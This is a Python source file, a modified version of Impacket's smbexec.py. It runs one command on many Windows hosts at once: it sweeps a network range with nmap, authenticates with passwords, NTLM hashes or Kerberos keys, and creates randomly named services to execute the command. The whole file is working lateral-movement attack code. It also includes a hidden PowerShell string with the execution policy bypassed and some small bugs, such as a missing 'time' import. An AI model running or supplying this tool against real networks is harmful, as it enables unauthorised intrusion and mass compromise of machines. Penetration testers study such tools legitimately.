#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   A similar approach to psexec w/o using RemComSvc. The technique is described here
#   https://www.optiv.com/blog/owning-computers-without-shell-access
#   Our implementation goes one step further, instantiating a local smbserver to receive the
#   output of the commands. This is useful in the situation where the target machine does NOT
#   have a writeable share available.
#   Keep in mind that, although this technique might help avoiding AVs, there are a lot of
#   event logs generated and you can't expect executing tasks that will last long since Windows
#   will kill the process since it's not responding as a Windows service.
#   Certainly not a stealthy way.
#
#   This script works in two ways:
#       1) share mode: you specify a share, and everything is done through that share.
#       2) server mode: if for any reason there's no share available, this script will launch a local
#          SMB server, so the output of the commands executed are sent back by the target machine
#          into a locally shared folder. Keep in mind you would need root access to bind to port 445
#          in the local machine.
#
# Author:
#   beto (@agsolino)
#
# Reference for:
#   DCE/RPC and SMB.
#
# Modified to implement a fix for https://github.com/fortra/impacket/issues/777
# albert-a's fix of 'sed -ri "s|(command\s*\+=.*')del|\1%COMSPEC% /Q /c del|" /usr/share/doc/python3-impacket/examples/smbexec.py'
# This makes smbexec.py work much better over a relay on ntlmrelayx.py and in general with certain Server 2019 builds of Windows
# !!# This is a heavily modified version of forta's smbexec.py to allow for a command to be passed from the command line as an argument rather than drop into a shell
#
# Added multithreading to allow for multiple targets to be hit with the same command.

from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import random
import string
import argparse

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging
from threading import Thread
from base64 import b64encode

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, smbserver
from impacket.dcerpc.v5 import transport, scmr
from impacket.krb5.keytab import Keytab

import nmap
import netifaces as ni
from pebble import ProcessPool

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)

OUTPUT_FILENAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 25)))
BATCH_FILENAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15))) + '.bat'
SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15)))
CODEC = sys.stdout.encoding
command = ''


class CMDEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=None,
                 kdcHost=None, share=None, port=445, serviceName=SERVICE_NAME, shell_type=None):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = serviceName
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s' % stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            self.shell = RemoteShell(self.__share, rpctransport, self.__serviceName, self.__shell_type, remoteName)
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            sys.exit(1)


class RemoteShell():
    def __init__(self, share, rpc, serviceName, shell_type, addr):

        self.__share = share
        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__serviceName = serviceName
        self.__rpc = rpc

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

        command_failed = False
        if command.find('&') == -1:
            self.send_data(command, addr)
        else:
            splitone = command.split(' && ')
            final = []
            for item in splitone:
                secondsplit = item.split(' & ')
                for thing in secondsplit:
                    final.append(thing)

            for comand in final:
                if command_failed == False:
                    tmphold = self.send_data(comand, addr)
                else:
                    print("{}: Skipping {} due to net use command failing".format(addr, comand))

                if options.unsafe_exec == False and tmphold.find('The command completed successfully') == -1 and tmphold.find('System error 85 has occurred') != -1:
                    command_failed = True

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
            pass

    def do_cd(self, s):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ')
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n', '') + '>'
            if self.__shell_type == 'powershell':
                self.prompt = 'PS ' + self.prompt + ' '
            self.__outputBuffer = b''

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        while True:  # this fixes the STATUS_SHARING_VIOLATION error thx Kyle <3
            try:
                self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
                break  # Exit the loop if getFile is successful
            except Exception as e:
                time.sleep(5)

            # This line will only be reached if the file is successfully retrieved
        self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        

    def execute_remote(self, data, shell_type='cmd'):

        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile

        command += ' & ' + '%COMSPEC% /Q /c del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data, addr):
        self.execute_remote(data, self.__shell_type)
        try:
            dat_out = self.__outputBuffer.decode(CODEC)
            print('{}: {}'.format(addr, self.__outputBuffer.decode(CODEC)))
            self.__outputBuffer = b''
            return dat_out
        except UnicodeDecodeError:
            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                          'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                          'again with -codec and the corresponding codec')
            print(self.__outputBuffer.decode(CODEC, errors='replace'))
        self.__outputBuffer = b''


def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
    print('\n[scanning hosts]')
    scanner = nmap.PortScanner()
    if os.path.isfile(inpu):  # if its in a file the arguments are different
        scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
    else:
        scanner.scan(hosts=inpu, arguments='-n -sn')
    uphosts = scanner.all_hosts()

    try:
        uphosts.remove(local_ip)  # no point in attacking ourselves
    except:
        pass

    print('[scan complete]')

    return uphosts


def mt_execute(ip):  # multithreading requires a function
    print("{} Executing against {}".format(green_plus, ip))
    try:
        executer = CMDEXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options.share, int(options.port), options.service_name, options.shell_type)
        executer.run(ip, ip)
        print("{} {}: Completed".format(green_plus, ip))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.critical(str(e))
        logging.error('{}: {}'.format(ip, str(e)))
        pass


# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    print('WARNING: The multiple command at once feature is extremely basic and has no error checking besides preventing overwriting of a mounted network drive')

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, cidr range, or iprange ex: 10.0.0.1, 10.0.0.0/24 10.0.0.10-25>')
    parser.add_argument('command', action='store', help='commandtorun')
    parser.add_argument('-share', action='store', default='C$', help='share where the output will be grabbed from '
                                                                     '(default C$)')
    parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-unsafe-exec', action='store_true', help='Allows commands to continue running even if a drive is in use when net use was attempted')
    parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
    parser.add_argument('-timeout', action='store', type=int, default=30, help='Set the timeout in seconds for each thread default=30')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute smbexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'], help='choose '
                                                                                                          'a command processor for the semi-interactive shell')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. '
                                                                            'If omitted it will use the domain part (FQDN) specified in the target parameter')

    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME,
                       help='The name of the'
                            'service used to trigger the payload')

    group = parser.add_argument_group('authentication')

    group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Must be run as sudo")
        sys.exit(1)

    # Init the example's logger theme
    logger.init(options.ts)
    command = options.command
    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.hashes is not None and options.hashes.find(':') == -1:  # quick check to prevent formatting error with hashes
        options.hashes = ':{}'.format(options.hashes)

    if options.aesKey is not None:
        options.k = True

    if options.ip is not None:  # did they give us the local ip in the command line
        local_ip = options.ip
        ifaces = ni.interfaces()
        try:  # check to see if the interface has an ip
            if local_ip in ifaces:
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                print("local IP => " + local_ip)
        except BaseException as exc:
            print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
            exit(0)
    else:
        # print local interfaces and ips
        print("")
        ifaces = ni.interfaces()
        for face in ifaces:
            try:  # check to see if the interface has an ip
                print(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
            except BaseException as exc:
                continue

        local_ip = input("\nEnter you local ip or interface: ")

        # lets you enter eth0 as the ip
        if local_ip in ifaces:
            local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
            print("local IP => " + local_ip)

    addresses = do_ip(address, local_ip)  # gets a list of up hosts

    if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
        print("{}[!]{} There are no targets up or the provided list is empty.".format(color_RED, color_reset))
        exit(0)

    print('Total targets: {}'.format(len(addresses)))

    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
        for ip in addresses:
            if options.localauth:
                domain = ip
            try:
                out = thread_exe.schedule(mt_execute, (ip,), timeout=options.timeout)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                logging.error(str(e))
                continue
            except KeyboardInterrupt as e:
                continue
